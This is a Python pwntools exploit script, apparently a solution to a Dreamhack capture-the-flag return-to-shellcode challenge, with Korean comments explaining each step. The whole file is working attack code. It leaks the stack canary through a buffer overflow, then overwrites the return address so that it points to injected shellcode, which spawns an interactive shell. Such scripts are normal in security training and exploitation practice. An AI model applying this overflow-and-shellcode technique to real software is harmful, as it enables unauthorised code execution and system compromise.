#!/usr/bin/env python3
# Name: r2s.py
from pwn import *
def slog(n, m): return success(': '.join([n, hex(m)]))
p = process('./0_problem_r2s')
#p = remote('host3.dreamhack.games ',24144)
context.arch = 'amd64'

# [1] Get information about buf
# | BUF | \x00 | Canary | SFP | RET |
p.recvuntil(b'buf: ')                    # 'buf: '가 출력될까지 대기
buf = int(p.recvline()[:-1], 16)         # 16진수 형태로 개행 제외하고 값을 전달 받아 10진수 형태로 저장
slog('Address of buf', buf)              # 10진수 형태의 값을 16진수로 출력
p.recvuntil(b'$rbp: ')                   # '$rbp: '가 출력될때까지 대기
buf2sfp = int(p.recvline().split()[0])   # buf와 rbp 사이의 값 출력
buf2cnry = buf2sfp - 8                   # buf와 카나리 사이 값 출력
slog('buf <=> sfp', buf2sfp)
slog('buf <=> canary', buf2cnry)

# [2] Leak canary value
payload = b'A'*(buf2cnry + 1)            # (+1) because of the first null-byte (= \x00)
p.sendafter(b'Input:', payload)          # 'Input: '가 출력되면 payload를 전달
p.recvuntil(payload)                     # payload가 출력될때까지 대기
cnry = u64(b'\x00'+p.recvn(7))           # 카나리를 big endian 으로 언패킹
slog('Canary', cnry)                     # 카나리 출력

# [3] Exploit
sh = asm(shellcraft.sh())                                            # 어셈블리 형태 쉘코드 확인
payload = sh.ljust(buf2cnry, b'A') + p64(cnry) + b'B'*0x8 + p64(buf) # 카나리 little endian으로 패킹
                                                                     # |  BUF   | \x00 | Canary | SFP      | RET         |
                                                                     # | 쉘코드 |     cnry      | BBBBBBBB | 쉘코드 위치 |   
# gets() receives input until '\n' is received
p.sendlineafter(b'Input:', payload)                                  # 페이로드 전달
p.interactive()                                                      # 유저에게 입출력을 다시 돌려준다
